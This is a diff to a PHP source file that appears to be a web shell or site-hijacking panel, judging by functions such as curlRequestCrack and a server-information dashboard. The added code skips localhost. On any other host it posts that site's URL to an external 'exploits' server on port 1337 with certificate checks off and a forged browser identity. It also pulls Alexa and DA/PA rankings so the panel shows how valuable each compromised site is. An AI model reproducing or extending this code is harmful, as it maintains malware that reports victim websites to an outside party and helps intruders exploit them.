@@ -452,6 +452,52 @@ function actionMultiDelete($dir) {
 	return false;
 }
 
+function curlPostGetRankDAPA($url)
+{
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "http://v1.exploits.my.id:1337/?tools=dapa");
+	curl_setopt($ch, CURLOPT_POST, true);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, "url=$url&pa=pa&go=Gaskan");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
+	curl_setopt($ch, CURLOPT_REFERER, "https://www.google.com");
+	$content = curl_exec($ch);
+	curl_close($ch);
+	return $content;
+}
+
+function getRankDAPA() {
+	// check is running in localhost?
+	if($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) return;
+
+	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+	$content 	= curlPostGetRankDAPA($url);
+
+	preg_match_all("/<oren>(.*?)<\/oren>:(.*?\S\s)/m", $content, $match, PREG_SET_ORDER, 0);
+
+	$data["DA"] = $match[0][2];
+	$data["PA"] = $match[1][2];
+
+	return $data;
+}
+
+function getRankAlexa() {
+	// check is running in localhost?
+	if($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1'])) return;
+
+	$url 		= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
+	$content 	= simplexml_load_file("http://data.alexa.com/data?cli=10&url=$url");
+	
+	if(!$content->SD) return 0;
+
+	$data['global_rank'] 	= (int) $content->SD->POPULARITY->attributes()->TEXT;
+	$data['local_rank'] 	= (int) $content->SD->COUNTRY->attributes()->RANK;
+	$data['country'] 		= $content->SD->COUNTRY->attributes()->NAME;
+
+	return $data;
+}
+
 function curlRequestCrack($info)
 {
 	$options 	= array();
@@ -874,6 +920,9 @@ function dashboard() {
 	global $free;
 	global $total;
 
+	$rank = getRankAlexa();
+	$rankDAPA = getRankDAPA();
+
 	$arrFind = [
 		"{{countDomain}}", 
 		"{{PHPVERSION}}", 
@@ -890,7 +939,11 @@ function dashboard() {
 		"{{APACHE}}",
 		"{{SM}}",
 		"{{ZIP}}",
-		"{{IPCLIENT}}"
+		"{{RANKGLOBAL}}",
+		"{{COUNTRY}}",
+		"{{RANKCOUNTRY}}",
+		"{{DARANK}}",
+		"{{PARANK}}",
 	];
 
 	$arrReplace = [ 
@@ -909,7 +962,11 @@ function dashboard() {
 		$apachemodul,
 		$sm,
 		$zip,
-		$_SERVER['REMOTE_ADDR'],
+		$rank['global_rank'],
+		$rank['country'],
+		$rank['local_rank'],
+		$rankDAPA["DA"],
+		$rankDAPA["PA"],
 	];
 
 	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
